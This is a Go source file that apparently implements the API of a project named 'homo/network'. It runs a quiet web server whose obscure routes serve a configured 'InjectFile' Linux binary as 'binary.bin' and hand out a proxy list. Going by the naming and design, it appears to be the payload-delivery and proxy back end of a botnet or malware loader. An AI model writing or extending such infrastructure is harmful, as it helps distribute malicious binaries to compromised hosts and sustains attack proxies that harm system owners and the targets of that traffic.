package api

import (
	"fmt"
	"homo/network/config"
	"io"
	"os"
	"strings"

	"github.com/fatih/color"
	"github.com/gin-gonic/gin"
)

func StartApi(c *config.Config) {

	gin.SetMode(gin.ReleaseMode)

	gin.DefaultWriter = io.Discard
	router := gin.New()

	if !c.Api.CustomPathEnabled {
		router.GET("/SXkmarwet7vghj", File)
	} else {
		router.GET(c.Api.CustomPath, File)
	}

	router.GET("/DewmDCSjihfwj", Proxy)

	fmt.Println("[HOMO] Api ready: " + c.Api.Server + ":" + c.Api.Port)
	err := router.Run(c.Api.Server + ":" + c.Api.Port)
	if err != nil {
		fmt.Println(err)
	}
}

func File(c *gin.Context) {

	color.Cyan("[Homo Api] New request: " + c.ClientIP())

	c.FileAttachment(config.GetConfig().InjectFile.Linux, "binary.bin")
}

func Proxy(c *gin.Context) {

	proxies, err := os.ReadFile("./data/proxies.txt")

	if err != nil {
		fmt.Println("Read proxies: " + err.Error())
		return
	}

	for _, i := range strings.Split(string(proxies), "\n") {
		c.String(200, i+"\n")
	}
}
